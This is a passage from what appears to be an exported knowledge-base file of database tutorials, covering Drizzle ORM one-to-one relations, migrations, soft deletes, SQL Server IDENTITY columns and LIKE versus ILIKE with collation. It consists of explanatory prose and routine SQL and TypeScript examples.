Google/GitHub)\n- User profiles (user + extended profile data)\n- Shopping cart (user + single active cart)\n- Settings (user + preferences)\n- Subscription (user + subscription details)\n\n## References\n\n- [Drizzle ORM Documentation](https://orm.drizzle.team/docs/overview)\n- [Drizzle Relations](https://orm.drizzle.team/docs/rqb#relations)\n- [PostgreSQL Foreign Keys](https://www.postgresql.org/docs/current/ddl-constraints.html#DDL-CONSTRAINTS-FK)\n- [Database Normalization Basics](https://en.wikipedia.org/wiki/Database_normalization)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Foreign Key Constraints Explained:**\n  ```typescript\n  // Without foreign key (❌ Bad - no enforcement)\n  userId: integer('user_id').notNull()\n  // Can insert userId=999 even if user doesn't exist\n  \n  // With foreign key (✅ Good - database enforces)\n  userId: integer('user_id')\n    .notNull()\n    .references(() => users.id)\n  // Database will reject userId=999 if user doesn't exist\n  \n  // With cascade delete\n  userId: integer('user_id')\n    .notNull()\n    .references(() => users.id, { onDelete: 'cascade' })\n  // When user is deleted, their account is automatically deleted\n  \n  // Options:\n  // - cascade: Delete child when parent deleted\n  // - set null: Set foreign key to null when parent deleted\n  // - restrict: Prevent parent deletion if child exists (default)\n  // - no action: Similar to restrict\n  ```\n\n- **Primary Key vs Foreign Key:**\n  ```typescript\n  // PRIMARY KEY: Unique identifier for THIS table\n  export const users = pgTable('users', {\n     id: serial('id').primaryKey(),  // ← Primary key\n     // Each user has unique id: 1, 2, 3, 4...\n   });\n   \n   // FOREIGN KEY: Points to primary key in ANOTHER table\n   export const accounts = pgTable('accounts', {\n     id: serial('id').primaryKey(),     // ← Primary key (for accounts)\n     userId: integer('user_id')\n       .references(() => users.id)      // ← Foreign key (points to users)\n     // userId must match an existing user.id\n   });\n   \n   Analogy:\n   - Primary key = Your passport number (unique to you)\n   - Foreign key = Emergency contact's passport number (must exist)\n   ```\n\n- **One-to-One vs One-to-Many:**\n  ```typescript\n  // ONE-TO-ONE: User has ONE account\n  export const usersRelations = relations(users, ({ one }) => ({\n     account: one(accounts)  // ← \"one\" means single account\n   }));\n   \n   // ONE-TO-MANY: User has MANY posts\n   export const usersRelations = relations(users, ({ many }) => ({\n     posts: many(posts)  // ← \"many\" means multiple posts\n   }));\n   \n   Database difference:\n   ONE-TO-ONE: Foreign key has UNIQUE constraint\n   export const accounts = pgTable('accounts', {\n     userId: integer('user_id')\n       .notNull()\n       .unique()  // ← Enforces one account per user\n       .references(() => users.id)\n   });\n   \n   ONE-TO-MANY: No unique constraint (multiple posts can have same userId)\n   export const posts = pgTable('posts', {\n     userId: integer('user_id')\n       .notNull()\n       .references(() => users.id)\n     // No .unique() - same user can have many posts\n   });\n   ```\n\n- **Type Safety in Action:**\n  ```typescript\n   import { db } from './db';\n   import { users, accounts } from './db/schema';\n   \n   // Drizzle infers types from schema\n   async function example() {\n     const user = await db.query.users.findFirst({\n       with: { account: true }\n     });\n     \n     // TypeScript knows exact structure:\n     user?.id         // ✅ number\n     user?.name       // ✅ string\n     user?.email      // ✅ string\n     user?.account    // ✅ { id: number; userId: number; ... } | null\n     user?.invalid    // ❌ TypeScript error: Property doesn't exist\n     \n     // Insert also type-checked\n     await db.insert(users).values({\n       name: 'Bob',\n       email: 'bob@example.com',\n       age: 30  // ❌ Error: age doesn't exist in schema\n     });\n   }\n   ```\n\n- **Migration (Creating Tables in Database):**\n  ```typescript\n   // Install: npm install drizzle-kit\n   \n   // drizzle.config.ts\n   import type { Config } from 'drizzle-kit';\n   \n   export default {\n     schema: './db/schema.ts',\n     out: './drizzle',\n     driver: 'pg',\n     dbCredentials: {\n       connectionString: process.env.DATABASE_URL!\n     }\n   } satisfies Config;\n   \n   // Generate migration SQL\n   // $ npx drizzle-kit generate:pg\n   \n   // Creates file: drizzle/0000_migration.sql\n   CREATE TABLE \"users\" (\n     \"id\" SERIAL PRIMARY KEY,\n     \"name\" TEXT NOT NULL,\n     \"email\" TEXT NOT NULL UNIQUE\n   );\n   \n   CREATE TABLE \"accounts\" (\n     \"id\" SERIAL PRIMARY KEY,\n     \"user_id\" INTEGER NOT NULL REFERENCES \"users\"(\"id\"),\n     \"provider\" TEXT NOT NULL,\n     \"token\" TEXT NOT NULL\n   );\n   \n   // Apply migration to database\n   // $ npx drizzle-kit push:pg\n   ```\n\n- **Complex Queries:**\n  ```typescript\n   import { db } from './db';\n   import { users, accounts } from './db/schema';\n   import { eq, like } from 'drizzle-orm';\n   \n   // Find users by email pattern with their accounts\n   async function findUsersByDomain(domain: string) {\n     return await db.query.users.findMany({\n       where: like(users.email, `%@${domain}`),\n       with: { account: true }\n     });\n   }\n   \n   // Count users with Google accounts\n   async function countGoogleUsers() {\n     const result = await db\n       .select({ count: sql`count(*)` })\n       .from(users)\n       .innerJoin(accounts, eq(users.id, accounts.userId))\n       .where(eq(accounts.provider, 'google'));\n     \n     return result[0].count;\n   }\n   \n   // Get all users, even those without accounts (LEFT JOIN)\n   async function getAllUsersWithOptionalAccount() {\n     return await db.query.users.findMany({\n       with: { account: true }\n     });\n     // Users without accounts will have account: null\n   }\n   ```\n\n- **Transaction Example:**\n  ```typescript\n   import { db } from './db';\n   import { users, accounts } from './db/schema';\n   \n   // Create user and account atomically (all or nothing)\n   async function createUserWithAccount(\n     userData: { name: string; email: string },\n     accountData: { provider: string; token: string }\n   ) {\n     return await db.transaction(async (tx) => {\n       // Insert user\n       const [user] = await tx\n         .insert(users)\n         .values(userData)\n         .returning();\n       \n       // Insert account\n       const [account] = await tx\n         .insert(accounts)\n         .values({\n           userId: user.id,\n           ...accountData\n         })\n         .returning();\n       \n       // If any step fails, both are rolled back\n       return { user, account };\n     });\n   }\n   \n   // Usage\n   try {\n     const result = await createUserWithAccount(\n       { name: 'Charlie', email: 'charlie@example.com' },\n       { provider: 'github', token: 'token123' }\n     );\n     console.log('Created:', result);\n   } catch (error) {\n     console.error('Transaction failed, nothing created');\n   }\n   ```\n\n- **Real-World Complete Example:**\n  ```typescript\n   // db/schema.ts\n   import { pgTable, serial, text, integer, timestamp } from 'drizzle-orm/pg-core';\n   import { relations } from 'drizzle-orm';\n   \n   export const users = pgTable('users', {\n     id: serial('id').primaryKey(),\n     name: text('name').notNull(),\n     email: text('email').notNull().unique(),\n     createdAt: timestamp('created_at').defaultNow().notNull()\n   });\n   \n   export const accounts = pgTable('accounts', {\n     id: serial('id').primaryKey(),\n     userId: integer('user_id')\n       .notNull()\n       .unique()  // ← Enforces one-to-one\n       .references(() => users.id, { onDelete: 'cascade' }),\n     provider: text('provider').notNull(),\n     providerAccountId: text('provider_account_id').notNull(),\n     accessToken: text('access_token'),\n     refreshToken: text('refresh_token'),\n     createdAt: timestamp('created_at').defaultNow().notNull()\n   });\n   \n   export const usersRelations = relations(users, ({ one }) => ({\n     account: one(accounts, {\n       fields: [users.id],\n       references: [accounts.userId]\n     })\n   }));\n   \n   export const accountsRelations = relations(accounts, ({ one }) => ({\n     user: one(users, {\n       fields: [accounts.userId],\n       references: [users.id]\n     })\n   }));\n   \n   // services/auth.ts\n   import { db } from '../db';\n   import { users, accounts } from '../db/schema';\n   import { eq } from 'drizzle-orm';\n   \n   export async function createUserWithGoogleAccount(googleProfile: any) {\n     return await db.transaction(async (tx) => {\n       // Check if user exists\n       const existingUser = await tx.query.users.findFirst({\n         where: eq(users.email, googleProfile.email),\n         with: { account: true }\n       });\n       \n       if (existingUser) {\n         return existingUser;\n       }\n       \n       // Create new user\n       const [newUser] = await tx\n         .insert(users)\n         .values({\n           name: googleProfile.name,\n           email: googleProfile.email\n         })\n         .returning();\n       \n       // Create account\n       const [newAccount] = await tx\n         .insert(accounts)\n         .values({\n           userId: newUser.id,\n           provider: 'google',\n           providerAccountId: googleProfile.id,\n           accessToken: googleProfile.accessToken\n         })\n         .returning();\n       \n       return { ...newUser, account: newAccount };\n     });\n   }\n   \n   export async function getUserProfile(userId: number) {\n     return await db.query.users.findFirst({\n       where: eq(users.id, userId),\n       with: { account: true }\n     });\n   }\n   ```\n\n- **Best Practices Summary:**\n  ```typescript\n   // ✅ Good practices:\n   \n   // 1. Always use foreign keys with references\n   userId: integer('user_id')\n     .notNull()\n     .references(() => users.id)\n   \n   // 2. Add unique constraint for one-to-one\n   userId: integer('user_id')\n     .notNull()\n     .unique()\n     .references(() => users.id)\n   \n   // 3. Use cascade for dependent data\n   .references(() => users.id, { onDelete: 'cascade' })\n   \n   // 4. Define relations separately\n   export const usersRelations = relations(users, ({ one }) => ({\n     account: one(accounts)\n   }));\n   \n   // 5. Use transactions for multi-step operations\n   await db.transaction(async (tx) => {\n     // Multiple operations\n   });\n   \n   // 6. Use .returning() to get created records\n   const [user] = await db.insert(users).values({...}).returning();\n   \n   // 7. Use proper naming conventions\n   // Table: plural, lowercase (users, accounts)\n   // Column: snake_case (user_id, created_at)\n   ```"
    },
    {
      "id": "swe/backend/databases/migrations",
      "title": "Database Migrations: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "migrations"
      ],
      "content": "# Database Migrations: A Well-Structured Overview\n\nDatabase migrations are a controlled way to evolve a database schema over time, ensuring consistency and traceability across development, testing, and production environments.\n\n## Key Points\n\n- **Schema Evolution:** Migrations manage changes to tables, columns, indexes, and constraints.\n- **Version Control:** Each migration is tracked, allowing rollbacks and reproducibility.\n- **Automation:** Tools (e.g., Flyway, Liquibase, Alembic, Prisma, Sequelize) automate migration application.\n- **Idempotency:** Migrations should be safe to run multiple times without causing errors.\n- **Rollback Support:** Enables undoing changes if a migration fails.\n- **Collaboration:** Multiple developers can safely contribute schema changes.\n- **Testing:** Migrations can be tested in CI/CD pipelines before production deployment.\n\n## Step-by-Step Explanation & Examples\n\n1. **Creating a Migration (SQL Example)**\n   ```sql\n   -- 001_add_users_table.sql\n   CREATE TABLE users (\n     id SERIAL PRIMARY KEY,\n     name VARCHAR(100),\n     email VARCHAR(100) UNIQUE\n   );\n   ```\n\n2. **Applying a Migration (CLI Example)**\n   ```sh\n   npx prisma migrate dev\n   # or\n   flask db upgrade\n   ```\n\n3. **Rolling Back a Migration**\n   ```sql\n   DROP TABLE users;\n   ```\n\n4. **Migration File Structure**\n   ```\n   migrations/\n     001_add_users_table.sql\n     002_add_orders_table.sql\n     003_modify_email_column.sql\n   ```\n\n## Common Pitfalls\n\n- Manual schema changes outside of migrations cause inconsistencies.\n- Not testing migrations before production deployment.\n- Failing to write rollback scripts for destructive changes.\n- Conflicting migrations from multiple developers.\n\n## Practical Applications\n\n- Evolving application features that require schema changes.\n- Maintaining data integrity and auditability.\n- Automating deployment and rollback in CI/CD pipelines.\n- Supporting multi-tenant or versioned databases.\n\n## References\n\n- [Flyway Documentation](https://flywaydb.org/documentation/)\n- [Prisma Migrate](https://www.prisma.io/docs/orm/prisma-migrate)\n- [Alembic (SQLAlchemy)](https://alembic.sqlalchemy.org/en/latest/)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Transactional Migrations:** Ensure all changes are applied atomically.\n- **Data Migrations:** Move or transform data alongside schema changes.\n- **Branching and Merging:** Handle migration conflicts in distributed teams.\n- **Zero-Downtime Migrations:** Techniques for updating large production databases without downtime.\n- **Migration Testing:** Use test databases and CI/CD to validate migrations"
    },
    {
      "id": "swe/backend/databases/soft-delete-db",
      "title": "Soft Deletes in Databases: A Well-Structured Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "soft-delete-db"
      ],
      "content": "# Soft Deletes in Databases: A Well-Structured Overview\n\nSoft deletes are a technique for marking records as deleted without actually removing them from the database. This approach preserves data for auditing, recovery, and historical analysis.\n\n## Key Points\n\n- **Definition:** Soft deletes flag records as deleted (e.g., with a `deleted` or `is_active` column) instead of physically removing them.\n- **Data Retention:** Enables recovery of deleted data and supports audit trails.\n- **Implementation:** Typically uses a boolean or timestamp column to indicate deletion.\n- **Query Filtering:** All queries must exclude soft-deleted records unless explicitly requested.\n- **Performance:** Can impact query performance if not indexed or filtered properly.\n- **Compliance:** Useful for meeting regulatory requirements for data retention.\n- **Cascade Deletes:** Related records may also need soft delete logic.\n\n## Step-by-Step Explanation & Examples\n\n1. **Schema Example**\n   ```sql\n   CREATE TABLE users (\n     id INT PRIMARY KEY,\n     name VARCHAR(100),\n     deleted_at TIMESTAMP NULL\n   );\n   ```\n\n2. **Soft Delete Operation**\n   ```sql\n   UPDATE users SET deleted_at = NOW() WHERE id = 123;\n   ```\n\n3. **Querying Non-Deleted Records**\n   ```sql\n   SELECT * FROM users WHERE deleted_at IS NULL;\n   ```\n\n4. **Restoring a Soft-Deleted Record**\n   ```sql\n   UPDATE users SET deleted_at = NULL WHERE id = 123;\n   ```\n\n## Common Pitfalls\n\n- Forgetting to filter out soft-deleted records in queries.\n- Not indexing the soft delete column, leading to slow queries.\n- Overcomplicating logic for cascade deletes or restoration.\n- Failing to handle unique constraints (e.g., re-adding a \\\"deleted\\\" username).\n\n## Practical Applications\n\n- Audit trails and historical data analysis.\n- Data recovery and undo functionality.\n- Regulatory compliance for data retention.\n- Avoiding accidental data loss in production systems.\n\n## References\n\n- [Soft Deletes in SQL: Best Practices](https://www.sqlshack.com/soft-delete-vs-hard-delete-in-sql-server/)\n- [PostgreSQL: Soft Deletes](https://wiki.postgresql.org/wiki/Soft_delete)\n- [Laravel Docs: Soft Deletes](https://laravel.com/docs/10.x/eloquent#soft-deleting)\n\n---\n\n## Greater Detail\n\n### Advanced Concepts\n\n- **Paranoid Models:** ORMs (e.g., Sequelize, Laravel Eloquent) offer built-in support for soft deletes.\n- **Archiving:** Move soft-deleted records to a separate archive table for performance.\n- **Event Sourcing:** Use event logs to track deletes and restores.\n- **Security:** Ensure soft-deleted data is not exposed in APIs or UIs.\n- **Automated Cleanup:** Periodically purge old soft-deleted"
    },
    {
      "id": "swe/backend/databases/sql/identity-sql",
      "title": "SQL IDENTITY(1,1): Complete Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "sql",
        "identity-sql"
      ],
      "content": "# SQL IDENTITY(1,1): Complete Overview\n\n`IDENTITY(1,1)` is a SQL Server property that auto-generates sequential numeric values for a column, starting at 1 and incrementing by 1 for each new row. The first number is the seed (starting value), the second is the increment (step size). Think of it like a ticket dispenser at a deli counter—each customer gets the next number automatically, no manual assignment needed.\n\n## Key Points\n\n- **Syntax:** `IDENTITY(seed, increment)`\n- **Common:** `IDENTITY(1,1)` starts at 1, increments by 1\n- **Auto-Generated:** Database assigns values automatically\n- **Primary Key:** Usually used with primary key columns\n- **Cannot Update:** Identity values cannot be manually updated (normally)\n\n## Basic Usage\n\n```sql\n-- Create table with identity column\nCREATE TABLE Users (\n    UserId INT IDENTITY(1,1) PRIMARY KEY,\n    Name VARCHAR(100),\n    Email VARCHAR(100)\n);\n\n-- Insert data (UserId auto-generated)\nINSERT INTO Users (Name, Email) \nVALUES ('Alice', 'alice@example.com');\n-- UserId = 1\n\nINSERT INTO Users (Name, Email) \nVALUES ('Bob', 'bob@example.com');\n-- UserId = 2\n\n-- Query results\nSELECT * FROM Users;\n/*\nUserId  Name    Email\n1       Alice   alice@example.com\n2       Bob     bob@example.com\n*/\n```\n\n## Syntax Breakdown\n\n```sql\n-- IDENTITY(seed, increment)\nUserId INT IDENTITY(1, 1)\n                    │   │\n                    │   └─ Increment: Add 1 each time\n                    └───── Seed: Start at 1\n\n-- Examples:\nIDENTITY(1, 1)    -- 1, 2, 3, 4, 5...\nIDENTITY(100, 1)  -- 100, 101, 102, 103...\nIDENTITY(1, 10)   -- 1, 11, 21, 31...\nIDENTITY(0, 1)    -- 0, 1, 2, 3...\nIDENTITY(1, -1)   -- 1, 0, -1, -2... (decrements)\n```\n\n## Common Patterns\n\n### Primary Key\n\n```sql\n-- Most common use case\nCREATE TABLE Orders (\n    OrderId INT IDENTITY(1,1) PRIMARY KEY,\n    CustomerId INT,\n    OrderDate DATETIME,\n    Total DECIMAL(10,2)\n);\n```\n\n### Get Last Inserted ID\n\n```sql\n-- Insert and get generated ID\nINSERT INTO Users (Name, Email) \nVALUES ('Charlie', 'charlie@example.com');\n\n-- Method 1: SCOPE_IDENTITY() (recommended)\nSELECT SCOPE_IDENTITY() AS NewUserId;\n-- Returns: 3\n\n-- Method 2: @@IDENTITY (all scopes)\nSELECT @@IDENTITY;\n\n-- Method 3: IDENT_CURRENT (by table)\nSELECT IDENT_CURRENT('Users');\n```\n\n### Starting Point Other Than 1\n\n```sql\n-- Start at 1000\nCREATE TABLE Invoices (\n    InvoiceId INT IDENTITY(1000, 1),\n    Amount DECIMAL(10,2)\n);\n\nINSERT INTO Invoices (Amount) VALUES (99.99);\n-- InvoiceId = 1000\n\nINSERT INTO Invoices (Amount) VALUES (199.99);\n-- InvoiceId = 1001\n```\n\n### Skip Numbers (Increment > 1)\n\n```sql\n-- Increment by 10\nCREATE TABLE Batches (\n    BatchId INT IDENTITY(1, 10),\n    Name VARCHAR(50)\n);\n\nINSERT INTO Batches (Name) VALUES ('Batch A');  -- BatchId = 1\nINSERT INTO Batches (Name) VALUES ('Batch B');  -- BatchId = 11\nINSERT INTO Batches (Name) VALUES ('Batch C');  -- BatchId = 21\n```\n\n## Managing Identity\n\n### Check Current Value\n\n```sql\n-- Get current identity value\nSELECT IDENT_CURRENT('Users') AS CurrentValue;\n\n-- Get seed and increment\nSELECT \n    IDENT_SEED('Users') AS SeedValue,\n    IDENT_INCR('Users') AS IncrementValue;\n```\n\n### Reset Identity\n\n```sql\n-- Reset to specific value\nDBCC CHECKIDENT ('Users', RESEED, 100);\n-- Next insert will be 101\n\n-- Reset to 0 (next will be 1)\nDBCC CHECKIDENT ('Users', RESEED, 0);\n\n-- Automatically reset to highest value\nDBCC CHECKIDENT ('Users', RESEED);\n```\n\n### Insert Explicit Values (Override)\n\n```sql\n-- Enable explicit inserts\nSET IDENTITY_INSERT Users ON;\n\nINSERT INTO Users (UserId, Name, Email) \nVALUES (999, 'Admin', 'admin@example.com');\n\nSET IDENTITY_INSERT Users OFF;\n\n-- Next auto-generated ID continues from highest\nINSERT INTO Users (Name, Email) \nVALUES ('Dave', 'dave@example.com');\n-- UserId = 1000 (if 999 was highest)\n```\n\n## IDENTITY vs Other Approaches\n\n```sql\n-- IDENTITY (SQL Server)\nCREATE TABLE Products (\n    ProductId INT IDENTITY(1,1) PRIMARY KEY\n);\n\n-- AUTO_INCREMENT (MySQL)\nCREATE TABLE Products (\n    ProductId INT AUTO_INCREMENT PRIMARY KEY\n);\n\n-- SERIAL (PostgreSQL)\nCREATE TABLE Products (\n    ProductId SERIAL PRIMARY KEY\n);\n\n-- SEQUENCE (Oracle, PostgreSQL)\nCREATE SEQUENCE product_seq START WITH 1;\nCREATE TABLE Products (\n    ProductId INT DEFAULT NEXTVAL('product_seq') PRIMARY KEY\n);\n```\n\n## Common Issues\n\n### Gaps in Sequence\n\n```sql\n-- Identity values have gaps after failed inserts or deletes\nINSERT INTO Users (Name, Email) VALUES ('Test', 'invalid');  -- UserId = 5\n-- Transaction fails or rollback\n\nINSERT INTO Users (Name, Email) VALUES ('Valid', 'valid@example.com');\n-- UserId = 6 (5 is skipped!)\n\n-- This is normal behavior - identity doesn't guarantee no gaps\n```\n\n### Maximum Value Reached\n\n```sql\n-- TINYINT max = 255\nCREATE TABLE Small (\n    Id TINYINT IDENTITY(1,1)\n);\n\n-- After 255 inserts:\n-- Error: Arithmetic overflow error\n\n-- Solution: Use larger data type\nCREATE TABLE Bigger (\n    Id INT IDENTITY(1,1)  -- Max ~2 billion\n);\n```\n\n### Table with Data, Adding Identity\n\n```sql\n-- Add identity to existing table (requires recreate)\n-- 1. Create new table with identity\nCREATE TABLE Users_New (\n    UserId INT IDENTITY(1,1) PRIMARY KEY,\n    Name VARCHAR(100),\n    Email VARCHAR(100)\n);\n\n-- 2. Copy data (identity auto-assigned)\nINSERT INTO Users_New (Name, Email)\nSELECT Name, Email FROM Users;\n\n-- 3. Drop old, rename new\nDROP TABLE Users;\nEXEC sp_rename 'Users_New', 'Users';\n```\n\n## Checking for Gaps\n\n```sql\n-- Find missing IDs\nWITH NumberSequence AS (\n    SELECT MIN(UserId) AS Num FROM Users\n    UNION ALL\n    SELECT Num + 1 FROM NumberSequence\n    WHERE Num < (SELECT MAX(UserId) FROM Users)\n)\nSELECT Num AS MissingId\nFROM NumberSequence\nWHERE Num NOT IN (SELECT UserId FROM Users);\n```\n\n## Best Practices\n\n```sql\n-- ✅ Use INT for most tables\nCREATE TABLE Standard (\n    Id INT IDENTITY(1,1) PRIMARY KEY\n);\n\n-- ✅ Use BIGINT for high-volume tables\nCREATE TABLE HighVolume (\n    Id BIGINT IDENTITY(1,1) PRIMARY KEY\n);\n\n-- ✅ Always include in Primary Key\nCREATE TABLE Good (\n    Id INT IDENTITY(1,1) PRIMARY KEY,\n    Data VARCHAR(100)\n);\n\n-- ❌ Don't use for natural keys\nCREATE TABLE Bad (\n    Email VARCHAR(100) PRIMARY KEY,  -- Use natural key\n    Name VARCHAR(100)\n);\n\n-- ❌ Don't rely on no gaps\n-- Identity guarantees uniqueness, not sequential without gaps\n\n-- ❌ Don't use for distributed systems\n-- Each database generates own sequence = potential conflicts\n-- Use GUIDs/UUIDs instead:\nCREATE TABLE Distributed (\n    Id UNIQUEIDENTIFIER DEFAULT NEWID() PRIMARY KEY\n);\n```\n\n## Quick Reference\n\n```sql\n-- Create with identity\nCREATE TABLE T (Id INT IDENTITY(1,1) PRIMARY KEY);\n\n-- Get last inserted\nSELECT SCOPE_IDENTITY();\n\n-- Reset identity\nDBCC CHECKIDENT ('TableName', RESEED, 100);\n\n-- Insert explicit value\nSET IDENTITY_INSERT TableName ON;\nINSERT INTO TableName (Id, Col) VALUES (999, 'Value');\nSET IDENTITY_INSERT TableName OFF;\n\n-- Check current value\nSELECT IDENT_CURRENT('TableName');\n```\n\n## References\n\n- [SQL Server IDENTITY](https://learn.microsoft.com/en-us/sql/t-sql/statements/create-table-transact-sql-identity-property)\n- [DBCC CHECKIDENT](https://learn.microsoft.com/en-us/sql/t-sql/database-console-commands/dbcc-checkident-transact-sql)\n\n---\n\n## Summary\n\n**IDENTITY(1,1):** Auto-generates sequential IDs starting at 1, incrementing by 1.\n\n**Syntax:** `ColumnName INT IDENTITY(seed, increment)`\n\n**Common Use:** Primary keys for surrogate IDs.\n\n**Get Last ID:** `SELECT SCOPE_IDENTITY()`\n\n**Reset:** `DBCC CHECKIDENT('Table', RESEED, value)`\n\n**Key Point:** Guarantees uniqueness, NOT sequential without gaps. Use INT for most tables, BIGINT for high-volume."
    },
    {
      "id": "swe/backend/databases/sql/like-ilike-sql",
      "title": "SQL LIKE vs ILIKE and Collation: Complete Overview",
      "path": [
        "swe",
        "backend",
        "databases",
        "sql",
        "like-ilike-sql"
      ],
      "content": "# SQL LIKE vs ILIKE and Collation: Complete Overview\n\nLIKE and ILIKE are SQL pattern-matching operators used in WHERE clauses to search for patterns in text. LIKE is case-sensitive (in most databases), while ILIKE is case-insensitive. Their behavior is influenced by collation—the rules that determine how characters are compared, sorted, and whether comparisons are deterministic (consistent) or non-deterministic (context-dependent). Think of LIKE as an exact pattern match and ILIKE as a flexible one, while collation is the rulebook that defines what \"matching\" means.\n\n## Key Points\n\n- **LIKE:** Case-sensitive pattern matching (standard SQL)\n- **ILIKE:** Case-insensitive pattern matching (PostgreSQL, not standard SQL)\n- **Collation:** Rules for character comparison (sorting, equality, case sensitivity)\n- **Deterministic Collation:** Same input always produces same result\n- **Non-Deterministic Collation:** Results may vary based on context or locale\n\n## High-Level Overview\n\n### What is LIKE?\n\nLIKE is a SQL operator for pattern matching using wildcards: `%` (any sequence of characters) and `_` (single character).\n\n```sql\n-- Case-sensitive in most databases\nSELECT * FROM users WHERE name LIKE 'John%';\n-- Matches: 'John', 'Johnson', 'Johnny'\n-- Does NOT match: 'john', 'JOHN'\n\nSELECT * FROM products WHERE code LIKE 'A_B';\n-- Matches: 'A1B', 'A9B', 'AXB'\n-- Does NOT match: 'AB', 'A12B'\n```\n\n### What is ILIKE?\n\nILIKE is a PostgreSQL-specific operator for case-insensitive pattern matching.\n\n```sql\n-- Case-insensitive (PostgreSQL only)\nSELECT * FROM users WHERE name ILIKE 'john%';\n-- Matches: 'John', 'JOHN', 'john', 'Johnny', 'JOHNNY'\n\n-- Standard SQL alternative (other databases)\nSELECT * FROM users WHERE LOWER(name) LIKE LOWER('john%');\n-- Or use COLLATE (if supported)\nSELECT * FROM users WHERE name LIKE 'john%' COLLATE Latin1_General_CI_AS;\n```\n\n### What is Collation?\n\nCollation defines the rules for comparing and sorting strings: case sensitivity, accent sensitivity, character order.\n\n```sql\n-- Example collations:\n-- Latin1_General_CS_AS: Case-Sensitive, Accent-Sensitive\n-- Latin1_General_CI_AS: Case-Insensitive, Accent-Sensitive\n-- Latin1_General_CI_AI: Case-Insensitive, Accent-Insensitive\n\n-- Different collation = different results\nSELECT * FROM users \nWHERE name = 'Café' COLLATE Latin1_General_CS_AS;\n-- Matches: 'Café'\n-- Does NOT match: 'café', 'CAFÉ'\n\nSELECT * FROM users \nWHERE name = 'Café' COLLATE Latin1_General_CI_AS;\n-- Matches: 'Café', 'café', 'CAFÉ'\n-- Does NOT match: 'Cafe' (accent different)\n```\n\n## Similarities\n\n### 1. Both Are Pattern Matching Operators\n\n```sql\n-- Both use same wildcard syntax\nSELECT * FROM products WHERE name LIKE 'Apple%';\nSELECT * FROM products WHERE name ILIKE 'Apple%';\n\n-- Both support _ and % wildcards\nLIKE 'a_c'   -- Matches: 'abc', 'a1c', 'aXc'\nILIKE 'a_c'  -- Same matches, but case-insensitive\n```\n\n### 2. Both Affected by Collation\n\n```sql\n-- LIKE respects collation\nSELECT * FROM users \nWHERE name LIKE 'José%' COLLATE Latin1_General_CS_AS;\n\n-- ILIKE also respects collation (for non-case aspects)\nSELECT * FROM users \nWHERE name ILIKE 'josé%' COLLATE Latin1_General_AS;\n-- Still case-insensitive, but collation affects accent handling\n```\n\n### 3. Both Support Escape Characters\n\n```sql\n-- Escaping wildcards\nSELECT * FROM files WHERE name LIKE '%.txt';\n-- Matches: 'any.txt', 'document.txt'\n\nSELECT * FROM files WHERE name LIKE '50\\%' ESCAPE '\\';\n-- Matches literal: '50%'\n-- '\\' tells SQL that % is literal, not wildcard\n\n-- Same for ILIKE\nSELECT * FROM files WHERE name ILIKE '50\\%' ESCAPE '\\';\n```\n\n### 4. Both Can Use Indexes (With Limitations)\n\n```sql\n-- Indexes can optimize LIKE/ILIKE with prefix patterns\nCREATE INDEX idx_name ON users(name);\n\nSELECT * FROM users WHERE name LIKE 'John%';  -- ✅ Can use index\nSELECT * FROM users WHERE name ILIKE 'john%'; -- ✅ Can use index (with special index)\n\n-- Leading wildcard prevents index usage\nSELECT * FROM users WHERE name LIKE '%John';  -- ❌ Can't use regular index\n```\n\n## Differences\n\n### 1. Case Sensitivity\n\n```sql\n-- LIKE: Case-sensitive by default\nSELECT * FROM users WHERE name LIKE 'john';\n-- Matches: 'john'\n-- Does NOT match: 'John', 'JOHN'\n\n-- ILIKE: Always case-insensitive\nSELECT * FROM users WHERE name ILIKE 'john';\n-- Matches: 'john', 'John', 'JOHN', 'JoHn'\n```\n\n### 2. Database Support\n\n```sql\n-- ILIKE: PostgreSQL only\n-- PostgreSQL\nSELECT * FROM users WHERE name ILIKE 'john%';  -- ✅ Works\n\n-- MySQL\nSELECT * FROM users WHERE name ILIKE 'john%';  -- ❌ Error\n\n-- SQL Server\nSELECT * FROM users WHERE name ILIKE 'john%';  -- ❌ Error\n\n-- Standard SQL alternative for case-insensitive:\n-- MySQL (case-insensitive by default with some collations)\nSELECT * FROM users WHERE name LIKE 'john%';\n\n-- SQL Server (use COLLATE)\nSELECT * FROM users WHERE name LIKE 'john%' COLLATE Latin1_General_CI_AS;\n\n-- Cross-database (works everywhere)\nSELECT * FROM users WHERE LOWER(name) LIKE LOWER('john%');\n```\n\n### 3. Performance\n\n```sql\n-- LIKE: Direct comparison, faster\nSELECT * FROM users WHERE name LIKE 'John%';\n-- Execution time: ~10ms\n\n-- ILIKE: Case conversion overhead\nSELECT * FROM users WHERE name ILIKE 'john%';\n-- Execution time: ~15ms (slightly slower)\n\n-- LOWER() approach: Function call overhead\nSELECT * FROM users WHERE LOWER(name) LIKE LOWER('john%');\n-- Execution time: ~20ms (slowest, can't use regular indexes)\n```\n\n### 4. Index Requirements\n\n```sql\n-- LIKE: Standard B-tree index works\nCREATE INDEX idx_name ON users(name);\nSELECT * FROM users WHERE name LIKE 'John%';  -- ✅ Uses index\n\n-- ILIKE: Requires special index (PostgreSQL)\nCREATE INDEX idx_name_lower ON users(LOWER(name));\nSELECT * FROM users WHERE name ILIKE 'john%';  -- ❌ Doesn't use idx_name\n\n-- Or use trigram index\nCREATE EXTENSION pg_trgm;\nCREATE INDEX idx_name_trgm ON users USING gin(name gin_trgm_ops);\nSELECT * FROM users WHERE name ILIKE '%john%';  -- ✅ Uses trigram index\n```\n\n### 5. Collation Override\n\n```sql\n-- LIKE with collation: Can override case sensitivity\nSELECT * FROM users \nWHERE name LIKE 'john%' COLLATE Latin1_General_CI_AS;\n-- Now case-insensitive like ILIKE\n\n-- ILIKE with collation: Stays case-insensitive\nSELECT * FROM users \nWHERE name ILIKE 'john%' COLLATE Latin1_General_CS_AS;\n-- Still case-insensitive (ILIKE always is)\n-- Collation only affects other aspects (accents, sorting)\n```\n\n## Deterministic vs Non-Deterministic Collation\n\n### What is Deterministic Collation?\n\nDeterministic collation produces consistent, predictable results—same input always gives same output.\n\n```sql\n-- Deterministic collation\nSELECT * FROM users \nWHERE name = 'Müller' COLLATE Latin1_General_CS_AS;\n-- Always matches: 'Müller' exactly\n-- Never matches: 'Mueller', 'MÜLLER', 'müller'\n\n-- Indexable and predictable\nCREATE INDEX idx_name ON users(name 